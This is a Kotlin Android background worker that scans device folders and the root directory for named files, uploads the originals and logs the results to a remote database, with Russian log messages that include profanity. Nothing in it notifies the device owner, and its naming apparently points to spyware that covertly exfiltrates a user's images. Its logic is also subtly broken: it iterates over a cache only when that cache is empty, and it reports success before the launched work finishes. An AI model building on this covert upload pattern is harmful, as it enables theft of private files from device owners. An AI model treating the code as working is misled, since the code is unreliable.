package com.anonymous.amorous.workers

import android.content.Context
import androidx.work.WorkerParameters
import com.anonymous.amorous.data.models.Candidate
import com.anonymous.amorous.utils.ScanCallback
import com.anonymous.amorous.utils.UploadBitmapUtils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.koin.standalone.inject

class FindFileWorker(
        appContext: Context,
        workerParams: WorkerParameters
) : BaseCoroutineWorker(appContext, workerParams) {

    private val upload: UploadBitmapUtils by inject()

    override suspend fun workAction(): Result {
        try {
            GlobalScope.launch(Dispatchers.IO) {
                val cache = database.getOriginalsCandidate("original_file_need_search")
                if (cache.isEmpty()) {
                    scanner.scanFolders { callback ->
                        when(callback) {
                            is ScanCallback.ResultOk -> {
                                val items = callback.items
                                for (candidate in cache) {
                                    val item = items.find { it.name == candidate.name }
                                    when {
                                        item != null -> actionUpload(item)
                                        else -> scanRoot(candidate)
                                    }
                                }
                            }
                            is ScanCallback.ResultFail -> {
                                addEvent(TAG, "Скинирование папок завершено с ошибкой! ${callback.fail}")
                            }
                        }
                    }
                }
            }
            return Result.success()
        } catch (e: Exception) {
            addEvent(TAG, "Пиздец! ${e.message}")
            return Result.failure()
        }
    }

    private fun scanRoot(candidate: Candidate) {
        scanner.scanRoot { callback ->
            when(callback) {
                is ScanCallback.ResultOk -> {
                    val items = callback.items
                    if (items.isNotEmpty()) {
                        for (item in items) {
                            if (item.name == candidate.name) {
                                actionUpload(item)
                            }
                        }
                    } else {
                        addEvent(TAG, "Сканирование рут директории завершено с пустым результатом!")
                    }
                }
                is ScanCallback.ResultFail -> {
                    addEvent(TAG, "Сканирование рут директории закончилось с ошибкой! ${callback.fail}")
                }
                else -> addEvent(TAG, "Сканирование рут директории закончилось хуй пойми как.")
            }
        }
    }

    private fun actionUpload(candidate: Candidate) {
        upload.uploadOriginal(candidate) { result ->
            addEvent(TAG, "Файл ${result.name} ${Candidate.getUploadStatus(candidate.originalStatus)}!")
            remoteDatabase.writeCandidateInDatabase(result) { callback ->
                when {
                    callback.isSuccess -> {
                        GlobalScope.launch { database.updateCandidate(callback.getOrDefault(result)) }
                    }
                    callback.isFailure -> {
                        addEvent(TAG, "${callback.exceptionOrNull()}")
                    }
                }
            }
        }
    }

    companion object {
        private const val TAG = "FindFileWorker"
    }
}